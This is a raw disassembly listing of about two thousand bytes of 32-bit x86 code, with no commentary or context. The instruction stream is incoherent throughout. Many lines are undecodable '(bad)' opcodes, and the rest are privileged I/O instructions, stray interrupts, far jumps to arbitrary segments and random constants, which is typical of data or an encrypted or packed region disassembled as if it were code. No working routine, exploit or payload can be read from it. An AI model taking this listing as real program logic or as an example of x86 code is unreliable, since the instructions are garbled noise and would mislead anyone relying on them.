  410afa:	sbb    edx,esi
  410afc:	stos   DWORD PTR es:[edi],eax
  410afd:	(bad)  
  410afe:	(bad)  
  410aff:	cli    
  410b00:	aam    0x87
  410b02:	mov    ah,0x6a
  410b04:	mov    eax,ds:0x3595e463
  410b09:	push   cs
  410b0a:	add    dh,BYTE PTR [edx]
  410b0c:	sahf   
  410b0d:	inc    eax
  410b0e:	jo     0x410b6f
  410b10:	imul   edx,DWORD PTR [esi],0x7352a7ab
  410b16:	sbb    BYTE PTR [ecx-0x305c035f],al
  410b1c:	xchg   DWORD PTR [esp+eax*2+0x38],eax
  410b20:	cdq    
  410b21:	push   esp
  410b22:	dec    ebx
  410b23:	jg     0x410b7e
  410b25:	gs xor dl,ah
  410b28:	xchg   ebp,eax
  410b29:	ds (bad) 
  410b2b:	psubq  mm4,QWORD PTR [ecx]
  410b2e:	test   al,0x30
  410b30:	jmp    0xd99e94b4
  410b35:	pusha  
  410b36:	rcl    BYTE PTR [edx-0x1b],1
  410b39:	xchg   BYTE PTR [edi-0x424375ba],dh
  410b3f:	xchg   esi,eax
  410b40:	popf   
  410b41:	mov    BYTE PTR es:[ebx],0x64
  410b45:	mov    ecx,DWORD PTR [ecx-0x107d3be3]
  410b4b:	(bad)  
  410b4c:	xor    al,0x6b
  410b4e:	les    esp,FWORD PTR [edx+0x6c9fd269]
  410b54:	lahf   
  410b55:	inc    edi
  410b56:	adc    ebp,DWORD PTR [edi-0x25dbd8ea]
  410b5c:	push   0x8
  410b5e:	sahf   
  410b5f:	xor    eax,0xc1b89e4d
  410b64:	sbb    DWORD PTR [eax-0x419778e9],esp
  410b6a:	dec    esi
  410b6b:	sub    eax,0x1188d482
  410b70:	sub    ah,BYTE PTR [edi+0x34]
  410b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b74:	stos   BYTE PTR es:[edi],al
  410b75:	and    eax,0xf60f4d5e
  410b7a:	adc    al,0x1a
  410b7c:	mov    edx,0x6fa87765
  410b81:	inc    ebp
  410b82:	cld    
  410b83:	cmp    BYTE PTR [ecx-0xc7e07b0],dh
  410b89:	aam    0xe2
  410b8b:	pusha  
  410b8c:	add    al,0x16
  410b8e:	fs clc 
  410b90:	jl     0x410b30
  410b92:	mov    dl,0x47
  410b94:	and    ebp,DWORD PTR [edx+0x6e947f8d]
  410b9a:	xor    BYTE PTR [ebp-0x45],bh
  410b9d:	daa    
  410b9e:	aam    0x86
  410ba0:	(bad)  
  410ba1:	sbb    eax,0xe9bc2fc
  410ba6:	inc    esi
  410ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba8:	lods   al,BYTE PTR ds:[esi]
  410ba9:	pop    esi
  410baa:	xchg   ecx,eax
  410bab:	add    ecx,esp
  410bad:	xor    al,0x77
  410baf:	jmp    0x410b3f
  410bb1:	mov    al,0x5d
  410bb3:	repz pop ebx
  410bb5:	xchg   ebp,eax
  410bb6:	mov    edi,0x5cceeb31
  410bbb:	shr    DWORD PTR [esi+esi*8-0x318b71e9],cl
  410bc2:	push   0x31993a7c
  410bc7:	jecxz  0x410c03
  410bc9:	xor    al,0xe1
  410bcb:	in     al,0x68
  410bcd:	jge    0x410c33
  410bcf:	sub    ebx,0x4ac0db96
  410bd5:	jmp    0x97e531a7
  410bda:	in     al,0x2e
  410bdc:	aas    
  410bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bde:	and    bh,0x6
  410be1:	jb     0x410bd7
  410be3:	mov    ah,0x48
  410be5:	mov    bh,0x2b
  410be7:	(bad)  
  410be8:	out    0x25,eax
  410bea:	(bad)  
  410beb:	aam    0x21
  410bed:	jae    0x410bb9
  410bef:	pop    es
  410bf0:	dec    ebx
  410bf1:	(bad)  
  410bf3:	sbb    edi,DWORD PTR [esp+ebp*8+0x78]
  410bf7:	sbb    eax,0xde40ac3b
  410bfc:	int3   
  410bfd:	dec    esi
  410bfe:	pop    es
  410bff:	xlat   BYTE PTR ds:[ebx]
  410c00:	stc    
  410c01:	xchg   edi,eax
  410c02:	cmp    dh,ch
  410c04:	adc    DWORD PTR [ecx-0xc1811e6],edi
  410c0a:	sub    edx,DWORD PTR [esp+ecx*8+0x2428454c]
  410c11:	out    0x36,eax
  410c13:	push   esp
  410c14:	stos   BYTE PTR es:[edi],al
  410c15:	mov    ebx,0x7831d50c
  410c1a:	and    di,WORD PTR [esi+ebx*4+0x3fdfdf1d]
  410c22:	lock (bad) 
  410c24:	xchg   ebx,eax
  410c25:	mov    edx,0x4e9f9ae8
  410c2a:	clc    
  410c2b:	es inc edi
  410c2d:	sbb    DWORD PTR [edx-0x4c4781f0],edx
  410c33:	div    al
  410c35:	dec    edi
  410c36:	push   ebx
  410c37:	push   ebp
  410c38:	dec    ecx
  410c39:	xchg   edi,eax
  410c3a:	cmp    ebp,esp
  410c3c:	add    ebp,DWORD PTR [ebp-0x21]
  410c3f:	or     BYTE PTR [edi+ebx*8],0x29
  410c43:	ja     0x410c65
  410c45:	imul   BYTE PTR [esi]
  410c47:	xchg   BYTE PTR [edi+0xf9885c2],bl
  410c4d:	dec    esi
  410c4e:	jno    0x410c9d
  410c50:	leave  
  410c51:	push   ecx
  410c52:	inc    edx
  410c53:	and    DWORD PTR [eax+ebp*1+0x3258a507],0xa900e3d8
  410c5e:	mov    ebp,0x4ad74e25
  410c63:	or     ebx,esi
  410c65:	add    al,0x8d
  410c67:	push   edx
  410c68:	and    bl,bl
  410c6a:	push   cs
  410c6b:	sub    DWORD PTR [edi-0x79],edx
  410c6e:	mov    ebx,0x7f4b6327
  410c73:	int    0x8
  410c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c76:	ja     0x410cf0
  410c78:	add    al,0x27
  410c7a:	cmp    eax,0xea4cdb8a
  410c7f:	adc    al,BYTE PTR [ebp-0x42]
  410c82:	jns    0x410c2d
  410c84:	pop    edi
  410c85:	imul   ecx,DWORD PTR [eax+0x33],0xbf289bcf
  410c8c:	sbb    al,0x6a
  410c8e:	gs and al,0x1b
  410c91:	push   ebx
  410c92:	ror    ebp,1
  410c94:	push   0x530dab91
  410c99:	(bad)  
  410c9a:	jmp    0x410cd1
  410c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c9d:	pop    esi
  410c9e:	lods   eax,DWORD PTR ds:[esi]
  410c9f:	vmovsd xmm1,QWORD PTR [edi+0x61c2930d]
  410ca7:	fadd   QWORD PTR [ecx-0xd]
  410caa:	push   ds
  410cab:	mov    al,0xd4
  410cad:	dec    edx
  410cae:	xchg   edi,eax
  410caf:	and    BYTE PTR [ebp+0x1b],0x4a
  410cb3:	int    0x80
  410cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb6:	ret    0x7fc7
  410cb9:	clc    
  410cba:	mov    al,dh
  410cbc:	or     eax,0xd89aa12d
  410cc1:	push   ecx
  410cc2:	(bad)  
  410cc3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc5:	mov    esi,eax
  410cc7:	in     eax,dx
  410cc8:	cli    
  410cc9:	dec    edi
  410cca:	outs   dx,DWORD PTR ds:[esi]
  410ccb:	jecxz  0x410d18
  410ccd:	pop    esp
  410cce:	pop    ebp
  410ccf:	loopne 0x410caf
  410cd1:	call   FWORD PTR [esi]
  410cd3:	inc    ebx
  410cd4:	xor    ch,0xbc
  410cd7:	test   al,0x46
  410cd9:	lds    esi,FWORD PTR [esi-0x64dc3027]
  410cdf:	pop    edx
  410ce0:	loope  0x410c77
  410ce2:	sar    BYTE PTR [esi+0x66],0xa6
  410ce6:	imul   esi,DWORD PTR [ecx-0x6f],0x63
  410cea:	test   eax,ebp
  410cec:	out    dx,al
  410ced:	loop   0x410d4b
  410cef:	sbb    dl,al
  410cf1:	dec    ebp
  410cf2:	push   ebx
  410cf3:	sub    DWORD PTR [ebp-0x707463ed],ebx
  410cf9:	loop   0x410d12
  410cfb:	mov    bh,0xa0
  410cfd:	dec    ebx
  410cfe:	xchg   BYTE PTR [ebx],bl
  410d00:	add    ebx,DWORD PTR [edi]
  410d02:	in     eax,dx
  410d03:	in     eax,dx
  410d04:	mov    eax,0x4b81ed2c
  410d09:	shl    dh,cl
  410d0b:	ficomp WORD PTR ds:0x3c946cc3
  410d11:	mov    ds:0x56ab5fbe,eax
  410d16:	test   DWORD PTR [eax+0x73],esp
  410d19:	inc    bx
  410d1b:	pop    DWORD PTR [eax+0x2128da54]
  410d21:	arpl   WORD PTR [edx],di
  410d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d24:	mov    edx,0xbf7a0253
  410d29:	or     al,0x4c
  410d2b:	leave  
  410d2c:	(bad)  [ebp+0xb]
  410d2f:	ins    BYTE PTR es:[edi],dx
  410d30:	push   ds
  410d31:	cmp    DWORD PTR [esi],esi
  410d33:	mov    al,0x8c
  410d35:	pop    es
  410d36:	jns    0x410ce8
  410d38:	dec    eax
  410d39:	sub    DWORD PTR ds:0xaa304a2e,0xab6ae662
  410d43:	mov    dl,0x11
  410d45:	cmp    al,0xb4
  410d47:	adc    DWORD PTR [esi],edi
  410d49:	pop    ss
  410d4a:	adc    ch,ch
  410d4c:	je     0x410d75
  410d4e:	stc    
  410d4f:	je     0x410d4b
  410d51:	ss ss into 
  410d54:	(bad)  
  410d55:	cdq    
  410d56:	mov    dh,0xfb
  410d58:	cmp    al,0x1a
  410d5a:	cmp    BYTE PTR [esi],ch
  410d5c:	push   cs
  410d5d:	mov    esi,0x33561225
  410d62:	mov    esi,esi
  410d64:	mov    al,ds:0x7c64adeb
  410d69:	out    0x17,al
  410d6b:	ror    ecx,0x68
  410d6e:	pop    eax
  410d6f:	inc    ebp
  410d70:	dec    esi
  410d71:	adc    dl,dh
  410d73:	imul   edx,DWORD PTR [ebx+esi*4],0xa1807b29
  410d7a:	lahf   
  410d7b:	pop    ecx
  410d7c:	mov    eax,ds:0x18f87ec2
  410d81:	mov    edx,ecx
  410d83:	mov    cl,0xab
  410d85:	sar    BYTE PTR [eax+0x7223db30],0x38
  410d8c:	mov    ch,0x35
  410d8e:	push   ebx
  410d8f:	add    BYTE PTR [eax+0x79],0xb1
  410d93:	push   edx
  410d94:	mov    dl,0xbf
  410d96:	pop    ebx
  410d97:	jb     0x410e16
  410d99:	inc    eax
  410d9a:	out    0x0,al
  410d9c:	sbb    BYTE PTR ds:0xd6953bcf,dh
  410da2:	or     DWORD PTR [edi-0x7b9f25c8],eax
  410da8:	ja     0x410e00
  410daa:	inc    ebx
  410dab:	and    DWORD PTR [eax+ebp*2],esp
  410dae:	add    bl,bh
  410db0:	mov    ecx,0xd39dffc9
  410db5:	cmp    ah,BYTE PTR [esi]
  410db7:	push   ds
  410db8:	imul   eax,DWORD PTR [ebx+0x352d72d2],0x3dae5e74
  410dc2:	in     eax,0x68
  410dc4:	mov    bl,0x4a
  410dc6:	mov    cs,WORD PTR [eax-0x18]
  410dc9:	push   eax
  410dca:	mov    DWORD PTR [edx],0xa2a9d505
  410dd0:	push   cs
  410dd1:	push   ss
  410dd2:	outs   dx,DWORD PTR ds:[esi]
  410dd3:	in     eax,dx
  410dd4:	xor    al,0xb8
  410dd6:	mov    bh,0xc2
  410dd8:	(bad)  
  410dd9:	pop    ebx
  410dda:	shl    DWORD PTR [edx],1
  410ddc:	inc    eax
  410ddd:	mov    DWORD PTR [eax+edi*8+0x36050b16],0x8ba88264
  410de8:	push   ebp
  410de9:	or     cl,ch
  410deb:	out    dx,eax
  410dec:	add    eax,DWORD PTR [eax]
  410dee:	add    BYTE PTR [edi-0x6],al
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0x778b3d1b
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410e3b
  410e08:	inc    edi
  410e09:	mov    WORD PTR [ebx+0x44ecda7],ds
  410e0f:	add    eax,0x4b7aa539
  410e14:	int3   
  410e15:	lods   eax,DWORD PTR ds:[esi]
  410e16:	adc    al,0xa7
  410e18:	mov    ecx,0x4f573438
  410e1d:	xchg   edi,eax
  410e1e:	arpl   WORD PTR [ebp+0x70d3cefc],di
  410e24:	out    dx,al
  410e25:	das    
  410e26:	add    esp,edi
  410e28:	sub    BYTE PTR [esi-0x1fbb2da4],bl
  410e2e:	ret    
  410e2f:	in     al,dx
  410e30:	adc    DWORD PTR [esi-0x8],ecx
  410e33:	sbb    eax,0xe5cd0c6b
  410e38:	sub    ch,cl
  410e3a:	mov    WORD PTR [esi+esi*1-0x3e],ds
  410e3e:	cmp    BYTE PTR [ecx+0x2e1b864],bl
  410e44:	scas   al,BYTE PTR es:[edi]
  410e45:	call   0x377a:0x2dfb3eee
  410e4c:	jnp    0x410ebc
  410e4e:	add    eax,0xcbfa4ca1
  410e53:	imul   edx,DWORD PTR fs:[esp+eax*1],0x75c3fa47
  410e5b:	inc    esi
  410e5c:	(bad)  
  410e5d:	xor    al,0x92
  410e5f:	jmp    0x5620:0x2b65cf96
  410e66:	lahf   
  410e67:	in     eax,0x2d
  410e69:	mov    bl,0xf7
  410e6b:	sbb    edi,0xffffffc5
  410e6e:	dec    ebx
  410e6f:	(bad)  [ebp-0x1d]
  410e72:	(bad)  
  410e73:	mov    al,0x60
  410e75:	or     BYTE PTR [edi+0x7b],bh
  410e78:	lds    ebx,FWORD PTR [esi-0x3f]
  410e7b:	push   cs
  410e7c:	fidivr DWORD PTR [ebx+0x11f83b30]
  410e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e83:	mov    eax,ds:0x56adb6af
  410e88:	dec    ecx
  410e89:	jmp    0x410eea
  410e8b:	sub    bh,BYTE PTR [edx]
  410e8d:	pop    edx
  410e8e:	sbb    DWORD PTR [ecx+ebx*8-0x24c5005a],eax
  410e95:	ror    DWORD PTR [ebx-0x572d823e],1
  410e9b:	push   edi
  410e9c:	push   edi
  410e9d:	or     dl,BYTE PTR [edi]
  410e9f:	sbb    dl,BYTE PTR [ecx+0x25]
  410ea2:	ja     0x410ed2
  410ea4:	in     eax,dx
  410ea5:	sbb    BYTE PTR [ebx],bh
  410ea7:	ins    BYTE PTR es:[edi],dx
  410ea8:	mov    dl,0x86
  410eaa:	jecxz  0x410e3e
  410eac:	sub    al,0x2b
  410eae:	ret    0x4ade
  410eb1:	sbb    BYTE PTR [edx-0x38],ch
  410eb4:	jnp    0x410ee4
  410eb6:	mov    ebx,0xd50d37d6
  410ebb:	aas    
  410ebc:	add    eax,0xcbcf6cfb
  410ec1:	imul   esi,ebp,0x3dc08413
  410ec7:	push   ecx
  410ec8:	dec    ebx
  410ec9:	xor    BYTE PTR [eax+0x4a],dl
  410ecc:	mov    bh,0xc1
  410ece:	pop    edx
  410ecf:	xchg   esp,eax
  410ed0:	mov    cl,0xdc
  410ed2:	rcr    BYTE PTR [edi],1
  410ed4:	mov    esp,0xc60b13e4
  410ed9:	loop   0x410e98
  410edb:	jmp    0xfcde:0x4ea6abc
  410ee2:	mov    esp,0xbcf430d5
  410ee7:	sub    BYTE PTR [ecx-0x5d],dh
  410eea:	mov    BYTE PTR [ebx-0x5],bh
  410eed:	pop    ecx
  410eee:	test   eax,0xb08d66f5
  410ef3:	bnd jb 0x410f22
  410ef6:	fild   QWORD PTR [eax+0x39]
  410ef9:	sbb    DWORD PTR [ebx],ebx
  410efb:	sbb    DWORD PTR [eax+0x5bc09042],edx
  410f01:	fwait
  410f02:	jns    0x410f73
  410f04:	(bad)
  410f07:	xchg   BYTE PTR [eax+edx*4-0x3dc72b67],cl
  410f0e:	(bad)  
  410f0f:	les    edi,FWORD PTR [ecx]
  410f11:	lods   al,BYTE PTR ds:[esi]
  410f12:	mov    dh,0xfb
  410f14:	cmp    eax,0x54e9f06d
  410f19:	mov    bl,0xf9
  410f1b:	xlat   BYTE PTR ds:[ebx]
  410f1c:	cld    
  410f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f1e:	inc    edi
  410f1f:	pushf  
  410f20:	inc    edi
  410f21:	mov    ah,0x8d
  410f23:	test   ebp,ecx
  410f25:	addr16 mov bh,0x54
  410f28:	jge    0x410edb
  410f2a:	or     eax,0xf8944f35
  410f2f:	aad    0xac
  410f31:	bnd jg 0x410ee5
  410f34:	test   edi,0xb3626cd0
  410f3a:	and    dh,BYTE PTR [eax]
  410f3c:	pushf  
  410f3d:	sbb    ebp,edi
  410f3f:	or     BYTE PTR [ebx-0x7c154be0],al
  410f45:	xor    DWORD PTR [ecx-0x2c],eax
  410f48:	pop    esi
  410f49:	fdiv   QWORD PTR [edx+0x61]
  410f4c:	stc    
  410f4d:	retf   0xbd9f
  410f50:	(bad)  
  410f51:	loop   0x410f7b
  410f53:	and    dl,BYTE PTR [esi]
  410f55:	adc    BYTE PTR [ebx+0x71],cl
  410f58:	ret    
  410f59:	xor    eax,0x4908eb06
  410f5e:	dec    edx
  410f5f:	dec    ebp
  410f60:	sub    eax,0x3a8ad532
  410f65:	or     esp,0x4a
  410f68:	or     al,0x13
  410f6a:	inc    esi
  410f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f6c:	or     BYTE PTR [eax],ah
  410f6e:	cs inc edi
  410f70:	dec    ecx
  410f71:	fidivr WORD PTR [eax]
  410f73:	leave  
  410f74:	and    al,0x47
  410f76:	in     eax,0x52
  410f78:	mov    dl,0x31
  410f7a:	dec    ebp
  410f7b:	or     ebp,edi
  410f7d:	sar    DWORD PTR [edi-0x6a598d1c],0xb6
  410f84:	shl    BYTE PTR [edi],0xe6
  410f87:	retf   
  410f88:	imul   ebx,DWORD PTR [edi],0xffffffef
  410f8b:	mov    esp,?
  410f8d:	mov    eax,0xe8730403
  410f92:	out    0x4e,eax
  410f94:	and    dl,BYTE PTR [ecx-0x43f4ce42]
  410f9a:	in     eax,dx
  410f9b:	int    0x9a
  410f9d:	inc    eax
  410f9e:	int3   
  410f9f:	adc    edi,esi
  410fa1:	pop    esi
  410fa2:	or     BYTE PTR [edx],ah
  410fa4:	or     eax,0x49fb211e
  410fa9:	js     0x410f3f
  410fab:	cwde   
  410fac:	adc    BYTE PTR [esi+0x4c900b90],bh
  410fb2:	jle    0x410f95
  410fb4:	sbb    ebx,DWORD PTR [ebp-0x62fd8c07]
  410fba:	mov    ecx,0xf6931a6c
  410fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fc0:	mov    DWORD PTR [ecx+0x36],ebp
  410fc3:	mov    esp,esp
  410fc5:	pop    edi
  410fc6:	sbb    eax,0x2fc9c7c6
  410fcb:	fistp  QWORD PTR [ebx+0x66]
  410fce:	jbe    0x411023
  410fd0:	aas    
  410fd1:	sar    bh,1
  410fd3:	inc    ecx
  410fd4:	sub    eax,0xc0a0c37b
  410fd9:	dec    ecx
  410fda:	ss sar al,1
  410fdd:	sbb    eax,0x7f1b92cc
  410fe2:	enter  0xf886,0x88
  410fe6:	sub    DWORD PTR [edi+0x7efb93d1],esi
  410fec:	nop
  410fed:	aaa    
  410fee:	or     al,0xb8
  410ff0:	xchg   ecx,eax
  410ff1:	sub    eax,0xd6b3e7bc
  410ff6:	mov    ds:0xe1893a93,al
  410ffb:	cmp    edx,DWORD PTR [esi+0x5d41877c]
  411001:	mov    dh,0xcc
  411003:	and    BYTE PTR [edx+0x63],0xeb
  411007:	xchg   ah,dh
  411009:	add    al,0xb0
  41100b:	stos   BYTE PTR es:[edi],al
  41100c:	xor    ch,BYTE PTR [ebx]
  41100e:	xor    BYTE PTR [esi-0x65],cl
  411011:	loop   0x411078
  411013:	test   BYTE PTR [ebp+0x48b0f71c],dl
  411019:	push   edx
  41101a:	test   BYTE PTR [esi-0xa54775a],ch
  411020:	xor    BYTE PTR ds:0x9abfe7e0,dh
  411026:	dec    edi
  411027:	cmp    al,0x44
  411029:	imul   edx,eax,0x9cc2f3c1
  41102f:	pusha  
  411030:	mov    ah,0x98
  411032:	adc    BYTE PTR [eax-0x2404b2e2],dh
  411038:	cld    
  411039:	scas   al,BYTE PTR es:[edi]
  41103a:	sbb    DWORD PTR [ebp+0x2b5e1fe1],edi
  411040:	mov    edi,0x94819861
  411045:	out    dx,eax
  411046:	cmp    al,0x9
  411048:	sub    DWORD PTR [esi-0x383a2ece],ebp
  41104e:	xchg   edx,eax
  41104f:	fnsetpm(287 only) 
  411051:	sbb    dh,BYTE PTR [eax-0x30d28779]
  411057:	pop    ecx
  411058:	sub    ebp,DWORD PTR [ebx+eiz*4]
  41105b:	and    al,0xa5
  41105d:	jecxz  0x411017
  41105f:	pusha  
  411060:	cmovg  esi,DWORD PTR [ebp+0x48798d77]
  411067:	sub    eax,0x46ff6be7
  41106c:	sub    BYTE PTR [edx+0x18],cl
  41106f:	std    
  411070:	jecxz  0x411019
  411072:	int3   
  411073:	dec    eax
  411074:	sti    
  411075:	push   esi
  411076:	(bad)  
  411077:	lahf   
  411078:	ja     0x411050
  41107a:	loop   0x4110bb
  41107c:	sar    DWORD PTR [ecx+0x28562292],1
  411082:	(bad)  
  411083:	pop    ss
  411084:	jl     0x411081
  411086:	test   BYTE PTR [eax],dh
  411088:	mov    edx,0x13a45d0a
  41108d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41108e:	xor    al,BYTE PTR [ebx+0x6fa445bc]
  411094:	sbb    al,0xbb
  411096:	(bad)  
  411097:	push   edi
  411098:	adc    BYTE PTR [eax-0x3ab568e0],bl
  41109e:	pushf  
  41109f:	lahf   
  4110a0:	xchg   ecx,eax
  4110a1:	or     DWORD PTR [edi],ebp
  4110a3:	dec    edi
  4110a4:	(bad)  [ecx]
  4110a6:	repz push ecx
  4110a8:	arpl   WORD PTR [edi+0x3500363b],bp
  4110ae:	jg     0x411122
  4110b0:	ja     0x4110d6
  4110b2:	mov    ah,0xeb
  4110b5:	jne    0x411040
  4110b7:	dec    esi
  4110b8:	jp     0x4110ea
  4110ba:	pusha  
  4110bb:	xchg   edx,eax
  4110bc:	call   0x501573d3
  4110c1:	es lahf 
  4110c3:	jl     0x41105b
  4110c5:	push   eax
  4110c6:	sar    cl,0x8c
  4110c9:	sub    bl,al
  4110cb:	inc    esp
  4110cd:	pop    ds
  4110ce:	add    al,0x30
  4110d0:	mov    edi,esi
  4110d2:	inc    ebp
  4110d3:	mov    ah,0xd8
  4110d5:	frstor [ecx]
  4110d7:	pop    ebx
  4110d8:	stos   BYTE PTR es:[edi],al
  4110d9:	and    ecx,DWORD PTR [ecx-0x4b]
  4110dc:	(bad)  
  4110dd:	jg     0x411106
  4110df:	repz push eax
  4110e1:	mov    DWORD PTR [eax+0x35fddb69],edi
  4110e7:	shr    DWORD PTR [ebp+0x57],cl
  4110ea:	rcl    BYTE PTR [ebp+0x22],1
  4110ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ee:	jg     0x411097
  4110f0:	retf   0x8e8d
  4110f3:	inc    esi
  4110f4:	dec    edx
  4110f5:	pop    edi
  4110f6:	outs   dx,DWORD PTR ds:[esi]
  4110f7:	stos   DWORD PTR es:[edi],eax
  4110f8:	and    al,0xb9
  4110fa:	xor    DWORD PTR [ebx],esp
  4110fc:	retf   0x95e8
  4110ff:	pop    ds
  411100:	(bad)  
  411101:	sbb    esp,DWORD PTR [esi+0x73ae9938]
  411107:	or     bh,dl
  411109:	imul   ecx,DWORD PTR [ebx],0x3ec31e87
  41110f:	pop    esp
  411110:	mov    edx,0xaeae176
  411115:	in     eax,dx
  411116:	cmp    bl,bl
  411118:	pop    ss
  411119:	ret    
  41111a:	out    0x8,eax
  41111c:	iret   
  41111d:	ss push edx
  41111f:	push   ecx
  411120:	icebp  
  411121:	jmp    0xd72185ef
  411126:	test   al,0x5f
  411128:	jle    0x41119f
  41112a:	fcomp  st(4)
  41112c:	not    DWORD PTR [ebx+0x7af24364]
  411132:	mov    WORD PTR [ecx+edi*4+0x2c570a0d],fs
  411139:	pop    esp
  41113a:	in     eax,dx
  41113b:	mov    al,ds:0xcd097d68
  411140:	imul   BYTE PTR [edx+0x45b2145e]
  411146:	test   eax,0x3e1fd976
  41114b:	push   ebx
  41114c:	rol    ch,cl
  41114e:	cmp    ebp,DWORD PTR [ebp+0x56]
  411151:	test   BYTE PTR [ebp+0x3],ch
  411154:	lock push es
  411156:	aad    0x49
  411158:	push   esp
  411159:	jl     0x41118d
  41115b:	test   eax,0x8151972
  411160:	jnp    0x41114a
  411162:	add    cl,BYTE PTR [esi+0x2]
  411165:	mov    cl,0x64
  411167:	dec    ebp
  411168:	repz fimul WORD PTR [ebp+esi*8-0x79f3d76e]
  411170:	xlat   BYTE PTR ds:[ebx]
  411171:	inc    eax
  411172:	cmp    dh,cl
  411174:	scas   eax,DWORD PTR es:[edi]
  411175:	jbe    0x41110b
  411177:	stos   DWORD PTR es:[edi],eax
  411178:	push   ss
  411179:	mov    dl,0xc6
  41117b:	int    0xe9
  41117d:	push   ebx
  41117e:	cmp    cl,BYTE PTR [ecx+ebp*1]
  411181:	cld    
  411182:	push   ebp
  411183:	dec    ebx
  411184:	fwait
  411185:	mov    ebx,ecx
  411187:	push   ecx
  411188:	rcl    ebx,cl
  41118a:	in     al,0xa1
  41118c:	arpl   WORD PTR [ecx],bx
  41118e:	(bad)  
  411190:	add    BYTE PTR [edx+esi*8+0x65a7f572],cl
  411197:	sbb    ebx,ebp
  411199:	jo     0x4111a2
  41119b:	cs test eax,0x7dc0bce6
  4111a1:	cli    
  4111a2:	aad    0xd4
  4111a4:	aas    
  4111a5:	dec    esi
  4111a6:	pop    ds
  4111a7:	push   ecx
  4111a8:	clc    
  4111a9:	addr16 loope 0x411142
  4111ac:	xor    al,0x84
  4111ae:	sbb    BYTE PTR [edx],ah
  4111b0:	es jmp 0xc9d8:0x1e8665f
  4111b8:	out    0x73,eax
  4111ba:	loopne 0x41118d
  4111bc:	cmp    eax,0x875a0425
  4111c1:	in     eax,0x14
  4111c3:	sub    BYTE PTR [ebx],ah
  4111c5:	fidiv  WORD PTR [eax]
  4111c7:	push   ecx
  4111c8:	add    eax,0x20d06d05
  4111cd:	jae    0x4111c1
  4111cf:	ins    DWORD PTR es:[edi],dx
  4111d0:	mov    eax,ds:0xe65a48ed
  4111d5:	les    edi,FWORD PTR [eax]
  4111d7:	ficom  DWORD PTR [edx+0x4a8d8daa]
  4111dd:	out    dx,al
  4111de:	xor    eax,ecx
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp+0x1f435cff],cl
  4111ff:	(bad)  
  411200:	fnstenv [ebx+0x70704495]
  411206:	dec    ecx
  411207:	jge    0x411279
  411209:	jo     0x41121f
  41120b:	(bad)  
  41120c:	std    
  41120d:	push   eax
  41120e:	push   edx
  41120f:	(bad)  
  411210:	rcr    si,1
  411213:	loope  0x411243
  411215:	loopne 0x4111f5
  411217:	pop    esi
  411218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411219:	cmp    DWORD PTR [esi+0x76],ebp
  41121c:	and    al,0x68
  41121e:	jnp    0x4111a4
  411220:	adc    BYTE PTR [ebx],ah
  411222:	inc    ecx
  411223:	xor    cl,dh
  411225:	in     al,dx
  411226:	pop    ecx
  411227:	mov    ah,0x31
  411229:	cmc    
  41122a:	pop    ds
  41122b:	ds (bad) 
  41122d:	adc    BYTE PTR [eax+0x754dbd8],bl
  411233:	(bad)  [eax-0x5f]
  411236:	fs jo  0x41128c
  411239:	test   DWORD PTR [edx+eax*8+0x2a],0x31325d1a
  411241:	(bad)  
  411242:	sahf   
  411243:	inc    ebp
  411244:	xor    esp,DWORD PTR [ebx]
  411246:	mov    esi,0xb748adee
  41124b:	sbb    eax,0xc25651b9
  411250:	cmp    dl,ch
  411252:	mov    al,ds:0x67975ec1
  411257:	ret    0xdb9f
  41125a:	stos   DWORD PTR es:[edi],eax
  41125b:	std    
  41125c:	lahf   
  41125d:	out    0x18,eax
  41125f:	(bad)  
  411260:	call   0x370f:0x673438a3
  411267:	xchg   edi,eax
  411268:	dec    edx
  411269:	inc    ecx
  41126a:	mov    ebp,0x330bbd3c
  41126f:	xor    eax,ecx
  411271:	sbb    al,0x92
  411273:	pop    esi
  411274:	aam    0xe6
  411276:	(bad)  
  411277:	xchg   ebx,eax
  411278:	retf   0x37d2
  41127b:	out    0x36,eax
  41127d:	mov    ebp,0xcae8e020
  411282:	into   
  411283:	push   es
  411284:	mov    BYTE PTR [ecx],dl
  411286:	clc    
  411287:	mov    edi,0xd754d35d
  41128c:	mov    edi,0x43e5fb88
  411291:	stos   BYTE PTR es:[edi],al
  411292:	sub    eax,0x3ab527c1
  411297:	xchg   esp,edi
  411299:	in     eax,dx
  41129a:	enter  0xb2ec,0xb0
  41129e:	or     al,BYTE PTR ds:0xfde25b0c
  4112a4:	jl     0x41129c
  4112a6:	test   eax,0x7362a0c0
  4112ab:	jge    0x41130c
  4112ad:	mov    ch,0x5
  4112af:	push   0x61da0475
  4112b4:	out    0xcf,eax
  4112b6:	pop    edi
  4112b7:	sbb    DWORD PTR [ebx-0x47],edi
  4112ba:	mov    edx,0x87308af3
  4112bf:	sub    cl,bh
  4112c1:	mov    dh,0xee
  4112c3:	lahf   
  4112c4:	adc    ebp,eax
  4112c6:	cli    
  4112c7:	xchg   ecx,eax
  4112c8:	loope  0x4112fa
  4112ca:	(bad)
  4112cd:	loopne 0x411345
